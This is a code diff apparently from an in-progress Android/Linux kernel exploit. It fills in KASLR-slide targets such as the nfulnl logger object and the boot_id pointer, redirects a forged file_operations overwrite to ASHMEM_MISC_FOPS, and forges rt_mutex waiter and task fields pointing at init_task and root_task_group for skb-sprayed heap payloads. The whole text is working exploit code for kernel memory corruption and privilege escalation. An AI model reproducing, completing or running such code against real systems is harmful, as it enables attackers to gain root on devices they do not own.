@@ -240,12 +240,16 @@ void log_startup_context(void) {
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
-             "delta=%016llx init_task=%016llx root_tg=%016llx\n",
+             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
+             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
              (unsigned long long)P0_KERNEL_PHYS_LOAD,
              (unsigned long long)P0_KERNEL_PHYS_DELTA,
+             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
+             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
              (unsigned long long)SLIDE_INIT_TASK,
-             (unsigned long long)SLIDE_ROOT_TASK_GROUP);
+             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
+             (unsigned long long)SLIDE_SYSCTL_BOOTID);
 }
 
 void disable_rseq_for_thread(void) {
@@ -580,9 +584,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           target = 0;
         }
 #else
-        // 【占位】等待选定新可控堆对象后填充 parent/target
-        parent = 0;
-        target = 0;
+        uintptr_t offset = slide_bank_offsets[slot];
+        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
+        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
 #endif
         slide_bank_parents[slot] = parent;
         slide_bank_targets[slot] = target;
@@ -632,16 +636,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_FOPS);
+    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_FOPS);
+    fake_right = data_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
-    fake_parent = data_addr(ASHMEM_FOPS) - 8;
+    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
     fake_right = fake_fops;
     fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
@@ -661,24 +665,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 
   uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_FOPS);
+  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
   uintptr_t write_left = 0;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = 0;
+    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
     write_right = 0;
-    write_left = 0;
+    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     waiter_task = fake_task;
     task_group = 0;
     pi_top_task = fake_task;
 #else
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
+    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
+    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
+    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
 #endif
     waiter_prio = SLIDE_FAKE_WAITER_PRIO;
   }
